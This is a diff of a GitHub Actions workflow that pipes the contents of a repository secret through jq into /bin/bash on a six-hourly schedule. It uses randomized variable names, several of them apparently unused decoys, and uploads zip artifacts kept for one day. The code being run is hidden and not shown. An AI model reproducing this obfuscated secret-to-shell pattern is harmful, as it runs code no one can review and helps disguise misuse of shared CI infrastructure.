@@ -1,28 +1,27 @@
 name: zhuiminzhenshi
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '23 1/6 * * *'
-jobs:  # 17265
+    - cron: '39 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhuiminzhenshi
         env:
-          klp04: ${{ secrets.klp04 }}
+          lj71533: ${{ secrets.lj71533 }}
         run: |
-          echo $klp04 | jq -r .e8835 | /bin/bash
-          echo $o0 | jq -r .npnr4523 | /bin/bash
-          echo $ssoi33 | jq -r .j777 | /bin/bash
-          echo $n47 | jq -r .jx97518 | /bin/bash
-          echo $t48 | jq -r .b30131 | /bin/bash
-          echo $lcbhf7335 | jq -r .onx8 | /bin/bash
-          echo $eeh3004 | jq -r .q2109 | /bin/bash
-          echo $lxi3 | jq -r .pw27102 | /bin/bash
-          echo $drwqp81680 | jq -r .jzcvt34853 | /bin/bash
-          echo $g3405 | jq -r .ceh8 | /bin/bash
-          echo $kvbdy5735 | jq -r .wgt55408 | /bin/bash
+          printf '%s' "$lj71533" | jq -r .fzzp389 | /bin/bash
+          echo $yrwb07 | jq -r .cpg724 | /bin/bash
+          echo $sqduq0629 | jq -r .ttl1316 | /bin/bash
+          echo $kkdu0 | jq -r .nvko5 | /bin/bash
+          printf '%s' "$m69547" | jq -r .henjs900 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ln4SBGJ3
+          path: "*.zip"
+          retention-days: 1
